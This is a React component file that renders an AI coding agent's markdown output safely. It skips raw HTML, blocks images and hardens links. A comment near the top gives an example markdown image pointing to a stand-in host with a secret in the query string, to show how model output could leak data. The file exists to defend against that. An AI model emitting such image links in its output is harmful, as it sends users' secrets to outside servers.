'use client'

import { cn } from '@shared/ui'
import { memo } from 'react'
import ReactMarkdown, { type Components } from 'react-markdown'
import remarkGfm from 'remark-gfm'

export type AgentMarkdownProps = {
  className?: string
  text: string
}

const REMARK_PLUGINS = [remarkGfm]
/** Model output could embed `![](https://host/?q=secret)` and leak data when the image loads:
 *  markdown images are never rendered (chat images arrive as their own events). */
const DISALLOWED_ELEMENTS = ['img']

/** Links always open in a new tab and never hand the opener to the target page. */
const COMPONENTS: Components = {
  a: ({ children, href }) => (
    <a href={href} rel="noopener noreferrer" target="_blank">
      {children}
    </a>
  ),
}

/**
 * Codex's markdown, styled like the project chat. Raw HTML is never rendered
 * (`skipHtml`), nor are markdown images (no remote loads), and wide tables and
 * code blocks scroll inside their own box instead of stretching the transcript.
 */
export const AgentMarkdown = memo(function AgentMarkdown({ className, text }: AgentMarkdownProps) {
  return (
    <div
      className={cn(
        'prose prose-ui max-w-none break-words text-sm',
        '[&_pre]:overflow-x-auto [&_table]:block [&_table]:overflow-x-auto',
        className,
      )}
    >
      <ReactMarkdown
        components={COMPONENTS}
        disallowedElements={DISALLOWED_ELEMENTS}
        remarkPlugins={REMARK_PLUGINS}
        skipHtml
        unwrapDisallowed
      >
        {text}
      </ReactMarkdown>
    </div>
  )
})
